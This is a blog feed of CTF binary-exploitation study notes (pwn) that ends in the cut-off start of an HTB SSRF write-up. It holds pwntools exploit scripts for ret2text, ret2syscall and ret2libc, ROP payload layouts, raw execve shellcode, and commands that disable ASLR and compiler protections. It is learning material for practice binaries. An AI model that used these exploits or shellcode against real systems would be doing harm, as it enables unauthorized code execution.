href="#read-function"></a> <code>read</code> Function</h3><ul><li>int read(int handle,void *buf,int len);<ol><li>handle 要读取的文件</li><li>buf内容保存缓存区</li><li>读取长度</li></ol></li></ul><h3 id="lenpayload-len"><a class="markdownIt-Anchor" href="#lenpayload-len"></a> len(payload) &lt; len</h3><ul><li>了解了read的函数机制，比如说要从0(标准输入)读取len长度到buff，并不会实时读取并存储，而是从你输入到缓存区的内容读取不超过要求长度的内容到buff区</li><li>所以应该注意到了如果输入内容是伴随<code>\n</code>，并且此时输入的长度还小于len，那么这个<code>\n</code>也是会被读取到buff区域的</li></ul><h3 id="lenpayload-len-2"><a class="markdownIt-Anchor" href="#lenpayload-len-2"></a> len(payload) = len</h3><ul><li>'\n’会被溢出到缓存区，如果下一个函数刚好执行了gets则会直接结束</li></ul><h3 id="gets-fucntion"><a class="markdownIt-Anchor" href="#gets-fucntion"></a> <code>gets</code> Fucntion</h3><ul><li>这个函数必须用sendline，因为他是识别到<code>\n</code>才会结束，但是会自动消除后面的回车符，并且在后面补充一个<code>\x00</code></li><li>但是当payload len=len的话也会造成<code>\x00</code>溢出去</li></ul><h3 id="scanf-fucntion"><a class="markdownIt-Anchor" href="#scanf-fucntion"></a> <code>scanf</code> Fucntion</h3><ul><li>当按下回车后，函数会从缓存区去读数据到buff直到遇到空白符</li></ul><h2 id="summary"><a class="markdownIt-Anchor" href="#summary"></a> Summary</h2><ul><li>read函数最好用send</li><li>gets和scanf只能用sendline才能有效输入</li><li>gets会清空缓存区的回车</li><li>scanf会因为缓存区有未清空回车导致无效输入</li></ul>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN trap </tag>
            
            <tag> Trouble shoot </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PWN Basic ROP</title>
      <link href="/2022/11/18/pwn-basic-rop/"/>
      <url>/2022/11/18/pwn-basic-rop/</url>
      
        <content type="html"><![CDATA[<h2 id="parameter-transfer"><a class="markdownIt-Anchor" href="#parameter-transfer"></a> Parameter Transfer</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="type">int</span> a = <span class="number">1</span>;</span><br><span class="line"><span class="type">int</span> b = <span class="number">2</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;sum: %d&quot;</span>, sum(a, b));</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">sum</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span> &#123;</span><br><span class="line"><span class="keyword">return</span> a + b;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="32-bit"><a class="markdownIt-Anchor" href="#32-bit"></a> 32-Bit</h3><ol><li>首先压入b的值</li><li>然后压入a的值</li><li><code>call sum</code>执行<code>push eip;jmp sum</code></li></ol><p>asm:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">0x0804841C    mov     [ebp+var_10], 1  # 此处变量赋值 a</span><br><span class="line">0x08048423    mov     [ebp+var_C], 2   # 此处变量赋值 b</span><br><span class="line">0x0804842A    sub     esp, 8</span><br><span class="line">0x0804842D    push    [ebp+var_C]  # 此处往栈中压入 b 的地址</span><br><span class="line">0x08048430    push    [ebp+var_10] # 此处往栈中压入 a 的地址</span><br></pre></td></tr></table></figure><p>此时栈空间</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># (sum next)</span><br><span class="line"># a</span><br><span class="line"># b</span><br></pre></td></tr></table></figure><h3 id="64-bit"><a class="markdownIt-Anchor" href="#64-bit"></a> 64-Bit</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">0x40052E    mov     [rbp+var_8], 1  # 变量 a 赋值</span><br><span class="line">0x400535    mov     [rbp+var_4], 2  # 变量 b 赋值</span><br><span class="line">0x40053C    mov     edx, [rbp+var_4]  # 变量 b 传参</span><br><span class="line">0x40053F    mov     eax, [rbp+var_8]  # 变量 a 传参</span><br><span class="line">0x400542    mov     esi, edx  # 变量 b 传参</span><br><span class="line">0x400544    mov     edi, eax  # 变量 a 传参</span><br></pre></td></tr></table></figure><ol><li>要知道64位程序参数传递顺序是<code>rdi rsi rdx rcx r8 r9</code></li><li>由于知道程序的sum下一条指令是return，所以栈空间如下</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># return address</span><br><span class="line"># a</span><br><span class="line"># b</span><br></pre></td></tr></table></figure><ol start="3"><li>执行完毕后</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># a</span><br><span class="line"># b</span><br></pre></td></tr></table></figure><hr /><h2 id="rop"><a class="markdownIt-Anchor" href="#rop"></a> ROP</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  init();</span><br><span class="line">  <span class="keyword">return</span> pwnme();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">pwnme</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf; <span class="comment">// [esp+4h] [ebp-44h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;pwd : &quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">0x100</span>u);</span><br><span class="line">  <span class="comment">// gets(&amp;buf); 64为程序中用的是gets</span></span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strcmp</span>(&amp;buf, <span class="string">&quot;1qazcde3&quot;</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;NO FUNCTION&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;DONE!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="32-bit-2"><a class="markdownIt-Anchor" href="#32-bit-2"></a> 32 Bit</h3><ul><li>payload构建:<code>p32(read_addr) + p32(system_addr) + p32(0) + p32(bss_addr) + p32(256)</code></li></ul><blockquote><p>相当于执行了read(0,bss_addr,256)后返回到system，此时栈空间如下,这个时候就执行了<code>system('/bin/sh')</code></p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># 0</span><br><span class="line"># bss_addr      此时已经写入/bin/sh字符串</span><br><span class="line"># 256   无用参数</span><br></pre></td></tr></table></figure><ul><li>万金油ORP构建:<ol><li>ROPgadget找出寄存器pop地址<blockquote><p>假设找到了<code>pop esi; pop edi; pop ebp; ret;</code></p></blockquote></li><li>构建payload：<code>p32(read_addr)+p32(0)+p32(bss_addr)+p32(256)+p32(pop_addr)+p32(system_addr)+p32(0)+p32(bss_addr)</code></li><li>上面执行完read后，pop清空寄存器，然后继续使用自定义参数</li></ol></li></ul><h3 id="64-bit-2"><a class="markdownIt-Anchor" href="#64-bit-2"></a> 64 Bit</h3><ul><li>payload构建：<code>p64(pop_rdi)+p64(bss_addr)+p64(gets_addr)+p64(pop_addr)+p64(bss_addr)+p64(system_addr)</code></li><li>32位和64位构建payload的方式不同主要原因是一个是一个是靠栈压入参数，另一个是靠寄存器传递参数</li></ul>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> param transfer </tag>
            
            <tag> ROP chain </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PWN commonly problem</title>
      <link href="/2022/10/25/pwn-learn/"/>
      <url>/2022/10/25/pwn-learn/</url>
      
        <content type="html"><![CDATA[<h2 id="堆栈平衡"><a class="markdownIt-Anchor" href="#堆栈平衡"></a> 堆栈平衡</h2><p>buuctf在做<code>pwn-rip</code>的时候发现本地执行exp脚本的时候可以正常获取到shell，这是一个危险函数的pwn题目，但是我尝试远程获取到shell的时候发现报错了，具体错误如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[+] Opening connection to node4.buuoj.cn on port 25705: Done</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">timeout: the monitored command dumped core</span><br><span class="line">[*] Got EOF while reading in interactive</span><br></pre></td></tr></table></figure><p>在网上经过一番查阅后发现是堆栈没有对齐的原因</p><h3 id="根本原因"><a class="markdownIt-Anchor" href="#根本原因"></a> 根本原因</h3><p>原题目为<code>buuctf-pwn-rip</code><br />glibc的payload调用system函数失败问题</p><h3 id="解决方案"><a class="markdownIt-Anchor" href="#解决方案"></a> 解决方案</h3><blockquote><p>地址16字节对齐，具体原因后面开辟新页面详解<br />exp如下</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">28503</span>)</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">23</span>+p64(<span class="number">0x401187</span>+<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>主要就是<code>p64(0x401187)</code>的源地址进行了+1字节对齐</p><h2 id="ebprbp字节填充"><a class="markdownIt-Anchor" href="#ebprbp字节填充"></a> ebp\rbp字节填充</h2><p>32位二进制文件填充需要4字节(ebp)</p><ul><li>魔数<code>0xcafebabe</code><br />64位二进制文件填充需要8字节(rbp)</li></ul><h2 id="自编译实验相关"><a class="markdownIt-Anchor" href="#自编译实验相关"></a> 自编译实验相关</h2><ul><li>NX（DEP）：堆栈字段可执行权限<ul><li>-z noexecstack //disable</li><li>-z execstack  //enable</li></ul></li><li>RELRO：GOT写保护<ul><li>-z norelro //disable</li><li>-z lazy //half_enable</li><li>-z now //full_enable</li></ul></li><li>PIE（ASLR）：地址随机化<ul><li>-no-pie //disable</li><li>-fpie -pie //powerful 1</li><li>-fPIE -pie //powerful 2</li></ul></li><li>CANARY：栈溢出哨兵<ul><li>-fno-stack-protector //disable</li><li>-fstack-protector //half_enable</li><li>-fstack-protector-all //full_enable</li></ul></li><li>FORTIFY：常用函数加强监测<ul><li>-D_FORTIFY_SOURCE=1 //weak_detect</li><li>-D_FORTIFY_SOURCE=1 //strong_detect</li></ul></li><li>汇编相关<ul><li>-m32 //生成32位汇编代码</li><li>-m64 //生成64位汇编代码</li></ul></li></ul><h2 id="linux系统aslr关闭"><a class="markdownIt-Anchor" href="#linux系统aslr关闭"></a> Linux系统ASLR关闭</h2><h3 id="地址随机化"><a class="markdownIt-Anchor" href="#地址随机化"></a> 地址随机化</h3><p>在今天测试程序的时候发现地址总是相隔很大，gdb调试起来也有很大问题，发现是Linux自带的ASLR也需要关闭</p><h3 id="解决方法root-access"><a class="markdownIt-Anchor" href="#解决方法root-access"></a> 解决方法(Root Access)</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> 0 &gt; /proc/sys/kernel/ramdomize_va_space</span><br></pre></td></tr></table></figure><blockquote><p><code>0</code>是关闭,<code>1</code>是普通,<code>2</code>是增强</p></blockquote><h2 id="关于leave的坑"><a class="markdownIt-Anchor" href="#关于leave的坑"></a> 关于leave的坑</h2><h3 id="相关问题"><a class="markdownIt-Anchor" href="#相关问题"></a> 相关问题</h3><p>在解决<code>sniperoj-pwn100-shellcode-x86-64</code>时发现shellcode在leave会丢失数据</p><h3 id="原因"><a class="markdownIt-Anchor" href="#原因"></a> 原因</h3><p>leave相当于move sp,bp    pop bp</p>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> stack overflow </tag>
            
            <tag> error solve </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Pwn Stack Overflow</title>
      <link href="/2022/10/24/pwn-basic/"/>
      <url>/2022/10/24/pwn-basic/</url>
      
        <content type="html"><![CDATA[<h2 id="栈溢出"><a class="markdownIt-Anchor" href="#栈溢出"></a> 栈溢出</h2><h3 id="栈基础"><a class="markdownIt-Anchor" href="#栈基础"></a> 栈基础</h3><ul><li>机制：First in Last Out</li><li>操作：push、pop</li></ul><h3 id="寄存器分配"><a class="markdownIt-Anchor" href="#寄存器分配"></a> 寄存器分配</h3><blockquote><p>一下为X86通常情况</p></blockquote><ul><li>EAX：保存函数返回值</li><li>EBX：保存局部变量</li><li>ECX：用于循环计数器</li><li>EDX：用于数学除法</li><li>ESP（Stack Point）：存放执行函数对应栈帧的栈顶地址（低地址）</li><li>EBP（Basic Point）：存放执行函数对应栈帧的栈底地址（高地址），用于C运行库访问栈中的局部变量和参数</li><li><u><strong>比较特殊的是EIP(Instruction Pointer)只能被ret jump call等指令隐含地改变</strong></u></li></ul><h3 id="stack-frame-details"><a class="markdownIt-Anchor" href="#stack-frame-details"></a> Stack Frame Details:</h3><blockquote><p>Source from wangan</p></blockquote><p><img src="/pictures/StackFrame.jpg" alt="StackFrame" /></p><blockquote><p>Source from wangan</p></blockquote><p><img src="/pictures/ASMCmd.png" alt="StackFrameCommand" /></p><h3 id="信息段"><a class="markdownIt-Anchor" href="#信息段"></a> 信息段</h3><ol><li>bss段<br />通常是指用来存放程序中未初始化的或者初始化为0的全局变量和局部静态变量的一块内存区域。BSS是英文Block Started by Symbol的简称。BSS段属于静态内存分配。</li><li>data段<br />数据段（data segment）通常是指用来存放程序中已初始化的全局变量和局部静态变量的一块内存区域，初始化为0的变量出于编译优化的策略还是被保存在BSS段。数据段属于静态内存分配。</li><li>rodata段<br />ro即Read-Only的意思，特殊情况如下</li></ol><ul><li>有些立即数与指令编译在一起直接放在代码段</li><li>对于字符串常量，编译器会去掉重复的常量，让程序的每个字符串常量只有一份。</li><li>有些系统中rodata段是多个进程共享的，目的是为了提高空间的利用率</li></ul><ol start="4"><li>.text段<br />存放程序代码，只可读并且在编译时确定代码段</li><li>.dynstr段<br />该段存放调用动态库信息和调用的相关函数</li></ol><h3 id="rettext"><a class="markdownIt-Anchor" href="#rettext"></a> rettext</h3><ol><li>常见题型</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">getTreasure</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;You get treasure here!&quot;</span>);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">vul</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">char</span> s[<span class="number">12</span>];</span><br><span class="line">    gets(s);</span><br><span class="line">    <span class="built_in">puts</span>(s);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    vul();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>比较典型的就是我们通过gets可以无限输入字符流的特点来将<code>EBP</code>覆盖掉，然后将返回地址改写至<code>getTreasure()</code></p><ol start="2"><li>EXP</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./ret2text&#x27;</span>)</span><br><span class="line">treasure_addr = <span class="string">&#x27;type your treasure_addr here&#x27;</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">20</span>+p32(<span class="number">0xcafebabe</span>)+p32(treasure_addr)</span><br><span class="line">p.sendline(payload)</span><br></pre></td></tr></table></figure><h3 id="ret2shellcode"><a class="markdownIt-Anchor" href="#ret2shellcode"></a> ret2shellcode</h3><ol><li>构造shellcode</li></ol><ul><li>手动构造: <code>shellcode = &quot;\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05&quot;</code></li><li>python-pwntools：<code>shellcode = asm(shellcraft.sh())</code></li></ul><ol start="2"><li>例题分析：</li></ol>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> v4; <span class="comment">// [sp+1Ch] [bp-64h]@1</span></span><br><span class="line"></span><br><span class="line">setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;No system for you this time !!!&quot;</span>);</span><br><span class="line">gets((<span class="type">char</span> *)&amp;v4);</span><br><span class="line"><span class="built_in">strncpy</span>(buf2, (<span class="type">const</span> <span class="type">char</span> *)&amp;v4, <span class="number">0x64</span>u);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;bye bye ~&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在main处设置断点</p>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">  0x804852e &lt;main+1&gt;:  mov    ebp,esp</span><br><span class="line">  0x8048530 &lt;main+3&gt;:  and    esp,0xfffffff0</span><br><span class="line">  0x8048533 &lt;main+6&gt;:  add    esp,0xffffff80</span><br><span class="line">=&gt; 0x8048536 &lt;main+9&gt;:  mov    eax,ds:0x804a060</span><br><span class="line">  0x804853b &lt;main+14&gt;: mov    DWORD PTR [esp+0xc],0x0</span><br><span class="line">  0x8048543 &lt;main+22&gt;: mov    DWORD PTR [esp+0x8],0x2</span><br><span class="line">  0x804854b &lt;main+30&gt;: mov    DWORD PTR [esp+0x4],0x0</span><br><span class="line">  0x8048553 &lt;main+38&gt;: mov    DWORD PTR [esp],eax</span><br></pre></td></tr></table></figure><h3 id="ret2syscall"><a class="markdownIt-Anchor" href="#ret2syscall"></a> ret2syscall</h3><ol><li>原理<br />ret2syscall，即控制程序执行系统调用，获取 shell</li><li>分析<br />由于开启了NX保护不能直接直接跳转程序中的某一段代码或者自己构造shellcode来进入shell，只能利用程序里gadget来达成目的<br />需要用到的工具<a href="https://github.com/JonathanSalwan/ROPgadget">ROPgadget</a></li></ol><ul><li>查找控制eax的gatget<br /><code>ROPgadget --binary rop --only 'pop|ret' | grep 'eax'</code></li><li>查找&quot;/bin/sh&quot;对应字符串<br /><code>ROPgadget --binary rop --string '/bin/sh'</code></li><li>查找system系统调用地址<blockquote><p>Linux 在x86上的系统调用通过 int 80h 实现    --wikipedia<br /><code>ROPgadget --binary rop --only 'int'</code></p></blockquote></li></ul><ol start="3"><li>例题</li></ol><blockquote><p>权限: CANARY:disabled  FORTIFY:disabled  NX:ENABLED  PIE:disabled  RELRO:Partial</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [sp+1Ch] [bp-64h]@1</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;This time, no system() and NO SHELLCODE!!!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;What do you plan to do?&quot;</span>);</span><br><span class="line">  gets(&amp;v4);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="4"><li>EXP</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p=process(<span class="string">&#x27;./rop&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pop_eax_ret = <span class="number">0x080bb196</span></span><br><span class="line">pop_ebx_ecx_edx_ret = <span class="number">0x0806eb90</span></span><br><span class="line">int_0x80 = <span class="number">0x08049421</span></span><br><span class="line">bin_string = <span class="number">0x80be408</span></span><br><span class="line"></span><br><span class="line">payload = flat([<span class="string">&#x27;a&#x27;</span>*<span class="number">112</span>,pop_eax_ret,<span class="number">0xb</span>,pop_ebx_ecx_edx_ret,<span class="number">0</span>,<span class="number">0</span>,bin_string,int_0x80])</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="ret2libc"><a class="markdownIt-Anchor" href="#ret2libc"></a> ret2libc</h3><ol><li>原理<br />执行libc中的函数，达到控制输出获取shell命令的目的</li><li>例子</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$: checksec ret2libc1    </span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [sp+1Ch] [bp-64h]@1</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(_bss_start, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;RET2LIBC &gt;_&lt;&quot;</span>);</span><br><span class="line">  gets((<span class="type">char</span> *)&amp;v4);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="3"><li>找到地址</li></ol><ul><li>找到/bin/sh  <code>ROPgadget --binary ret2libc1 --string '/bin/sh' </code></li><li>找到system函数地址 <code>info address system</code>(gdb)</li></ul><ol start="4"><li>EXP</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./ret2libc&#x27;</span>)</span><br><span class="line"></span><br><span class="line">binsh_addr = <span class="number">0x8048720</span></span><br><span class="line">system_plt = <span class="number">0x08048460</span></span><br><span class="line">payload = flat([<span class="string">&#x27;a&#x27;</span> * <span class="number">112</span>, system_plt, <span class="number">0xdeadbeef</span>, binsh_addr])</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><blockquote><p>这里的’b’*4是system的虚假返回地址，binsh_addr是system的第一个参数，相当于执行了system(‘/bin/sh’);</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Basic Knowledge </tag>
            
            <tag> Stack Overflow </tag>
            
            <tag> Noob </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTB Health Machine Challenge</title>
      <link href="/2022/09/16/htb-health/"/>
      <url>/2022/09/16/htb-health/</url>
      
        <content type="html"><![CDATA[<h2 id="valuable-content"><a class="markdownIt-Anchor" href="#valuable-content"></a> Valuable Content</h2><p><a href="https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery">Server Side Request Forgery</a></p><h2 id="get-user"><a class="markdownIt-Anchor" href="#get-user"></a> Get User</h2><h3 id="open-ports"><a class="markdownIt-Anchor" href="#open-ports"></a> open ports</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">PORT     STATE    SERVICE</span><br><span class="line">22/tcp   open     ssh</span><br><span class="line">80/tcp   open     http</span><br><span class="line">3000/tcp filtered ppp</span><br></pre></td></tr></table></figure><h3 id="springboard-website"><a class="markdownIt-Anchor" href="#springboard-website"></a> springboard website</h3><p>访问<code>health.htb</code>目标下的80端口网站，发现这是一个网站检测服务，并且让我们输入webhook,经过判定可以发现这是一个SSRF攻击。用如下图可以表示<br /><img src="/pictures/SSRF.png" alt="ssrf_attack" 